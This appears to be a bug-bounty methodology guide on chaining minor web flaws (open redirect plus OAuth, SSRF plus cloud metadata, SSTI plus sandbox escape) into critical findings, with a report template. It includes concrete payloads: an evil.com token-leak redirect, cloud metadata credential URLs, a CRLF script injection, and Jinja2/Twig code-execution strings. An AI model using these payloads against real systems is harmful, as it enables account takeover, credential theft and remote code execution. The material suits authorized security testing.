# Vulnerability Chain Building

## Core Principle

Individual low-severity bugs often get marked informative or won't fix. Chaining them into a realistic attack scenario raises severity, demonstrates real-world impact, and dramatically increases bounty payouts.

---

## Common Chain Patterns

### 1. Open Redirect + OAuth = Account Takeover

```
Severity: Low + Medium = Critical

Chain:
1. Find open redirect on target: https://target.com/redirect?url=https://evil.com
2. OAuth callback allows redirect to any path on target.com
3. Use open redirect as the redirect_uri:
   https://target.com/oauth/callback?redirect_uri=https://target.com/redirect?url=https://evil.com
4. Authorization code or token leaks to evil.com via redirect
5. Attacker exchanges code for session = full account takeover

Why it works: OAuth implementations often whitelist the domain but not the full path,
allowing open redirects on the same domain to exfiltrate tokens.
```

### 2. Self-XSS + CSRF = Stored XSS on Victim

```
Severity: Informative + Low = Medium-High

Chain:
1. Find self-XSS: user can inject JS into their own profile/settings
2. Find CSRF on the profile update endpoint (no CSRF token or SameSite bypass)
3. Craft CSRF page that updates victim's profile with XSS payload
4. Victim visits attacker page --> their profile now contains stored XSS
5. Anyone viewing the victim's profile triggers the payload

Variation: Self-XSS + login CSRF
1. Self-XSS exists in account settings
2. Login CSRF: force victim to log into attacker's account
3. Victim is now in attacker's account with the stored XSS
4. Payload steals victim's data or performs actions
```

### 3. SSRF + Cloud Metadata = Credential Theft

```
Severity: Low/Medium + Info = Critical

Chain:
1. Find SSRF (even blind/partial -- URL fetch, webhook, PDF generator, image proxy)
2. Target runs on AWS/GCP/Azure
3. SSRF to metadata endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/
4. Extract temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)
5. Use credentials to access S3 buckets, databases, or other AWS services

Cloud metadata URLs:
- AWS: http://169.254.169.254/latest/meta-data/
- GCP: http://metadata.google.internal/computeMetadata/v1/ (requires header)
- Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
- DigitalOcean: http://169.254.169.254/metadata/v1/
```

### 4. CSPT + CORS Misconfiguration = Data Theft

```
Severity: Low + Low = High

Chain:
1. Client-Side Path Traversal: user input controls part of a fetch URL
   fetch('/api/user/' + userInput + '/data')
2. Inject traversal: userInput = '../../admin/secrets'
3. Combined with CORS misconfiguration that reflects Origin header
4. Attacker page triggers CSPT to make authenticated requests to sensitive endpoints
5. CORS allows reading the response cross-origin
```

### 5. CRLF Injection + Cache Poisoning = Stored XSS

```
Severity: Low + Medium = High

Chain:
1. CRLF injection in a response header:
   /page?lang=en%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
2. Response now contains attacker-controlled HTML
3. If response is cached by CDN/proxy, all users receive poisoned response
4. Mass-impact stored XSS via cache poisoning
```

### 6. Race Condition + Payment = Financial Loss

```
Severity: Low + Business Logic = High-Critical

Chain:
1. Add item to cart, go to checkout
2. Send payment request multiple times simultaneously (race condition)
3. Single payment authorizes, but multiple fulfillments occur
4. Or: apply discount code in race condition to stack discounts beyond intended limit

Tools: Burp Turbo Intruder, custom script with threading
```

### 7. Information Disclosure + IDOR = Data Breach

```
Severity: Info + Medium = High

Chain:
1. Find endpoint that leaks user IDs: /api/users/search?q=a returns UUIDs
2. Use leaked UUIDs in IDOR: /api/users/{uuid}/documents
3. Information disclosure alone is low/info, IDOR alone might be limited
4. Together: enumerate all users and access all their documents
```

### 8. Subdomain Takeover + Cookie Scope = Session Hijack

```
Severity: Medium + Low = High-Critical

Chain:
1. Subdomain takeover on abandoned.target.com
2. Session cookies scoped to .target.com (no subdomain restriction)
3. Host phishing page on abandoned.target.com
4. Victim visits abandoned.target.com, attacker reads .target.com cookies
5. Attacker uses session cookie to hijack victim's session on target.com
```

### 9. XSS + API Token Theft = Persistent Access

```
Severity: Medium + Info = High

Chain:
1. Stored XSS on target application
2. XSS payload reads API token from localStorage/sessionStorage/cookies
3. Send token to attacker server
4. API token provides persistent access (doesn't expire with session)
5. Even after XSS is patched, attacker retains access via stolen token
```

### 10. SSTI + Sandbox Escape = RCE

```
Severity: Medium + High = Critical

Chain:
1. Server-Side Template Injection: {{7*7}} returns 49
2. Identify template engine (Jinja2, Twig, Freemarker, etc.)
3. Use engine-specific sandbox escape to achieve code execution:
   Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## How to Think About Chaining

### Step 1: Catalog Your Low-Severity Findings

Keep a running list per target:
- Open redirects (even on subdomains)
- Self-XSS (any user-controlled output, even in own profile)
- Information disclosures (user IDs, internal paths, version numbers)
- CSRF on non-critical endpoints
- CORS misconfigurations
- CRLF injections
- Path traversal (even partial)
- Weak rate limiting

### Step 2: Map Relationships

For each finding, ask:
- **What does this give me?** (redirect control, header injection, ID leakage)
- **What would I need to combine this with?** (a second bug that consumes this output)
- **What attack primitives does this enable?** (token theft, request forgery, code execution)

### Step 3: Work Backward from Impact

Start with the desired impact and work backward:

```
Goal: Account Takeover
  Needs: session token or password
    Needs: XSS that reads cookies OR OAuth token leak OR password reset hijack
      XSS: do I have stored XSS? Self-XSS + CSRF?
      OAuth: do I have open redirect on the target domain?
      Reset: do I have host header injection?

Goal: Data Breach
  Needs: access to other users' data
    Needs: IDOR with valid IDs OR SQL injection
      IDOR: do I have ID leakage from another endpoint?
      SQLi: do I have any unsanitized input reaching a query?

Goal: RCE
  Needs: code execution on server
    Needs: SSTI OR file upload to webroot OR deserialization OR SSRF to internal service
      SSRF: do I have any URL fetch, webhook, or image proxy?
```

### Step 4: Test the Full Chain

- Execute the complete chain end-to-end
- Document each step with screenshots
- Show that each link in the chain is necessary
- Demonstrate the final impact clearly

---

## Severity Escalation Reference

| Solo Bug | Chain Partner | Combined Result | Approx Severity |
|----------|--------------|-----------------|-----------------|
| Open Redirect | OAuth flow | Account Takeover | Critical |
| Self-XSS | CSRF | Stored XSS | Medium-High |
| Self-XSS | Login CSRF | Data Theft | Medium |
| SSRF (blind) | Cloud metadata | Credential Theft | Critical |
| Info Disclosure (IDs) | IDOR | Mass Data Access | High |
| CRLF Injection | Cache/CDN | Stored XSS (mass) | High |
| Subdomain Takeover | Cookie scope | Session Hijack | High-Critical |
| CSPT | CORS misconfig | Cross-origin data theft | High |
| Race Condition | Payment flow | Financial fraud | High-Critical |
| XSS (any) | API token in storage | Persistent access | High |
| SSTI | Sandbox escape | RCE | Critical |
| Path Traversal | File write | RCE | Critical |

---

## When Chaining Is Worth Reporting

**Report the chain if:**
- Combined severity is Medium or above
- The chain is reliable (works > 80% of the time)
- Each step is clearly documented
- The final impact is concrete (ATO, data breach, RCE, financial loss)
- Requires reasonable user interaction (1 click is fine, complex multi-step is weak)

**Skip the chain if:**
- Combined severity is still Low
- Chain requires improbable conditions (victim must be using specific browser version + specific extension + be on specific page)
- Chain has more than 4 links (reliability drops exponentially)
- The "chain" is really just one bug with extra steps (don't overcomplicate)

---

## Report Format for Chains

```
Title: [Final Impact] via [Bug A] + [Bug B] chain

Summary: Combining [Bug A] with [Bug B] allows an attacker to [final impact].

Steps:
1. [First bug exploitation with details]
2. [How output of step 1 feeds into step 2]
3. [Second bug exploitation]
4. [Final impact demonstration]

Impact: [Concrete impact statement - ATO, data access, etc.]

Individual bugs:
- Bug A alone: [severity] - [limited impact]
- Bug B alone: [severity] - [limited impact]
- Combined: [higher severity] - [full impact]
```
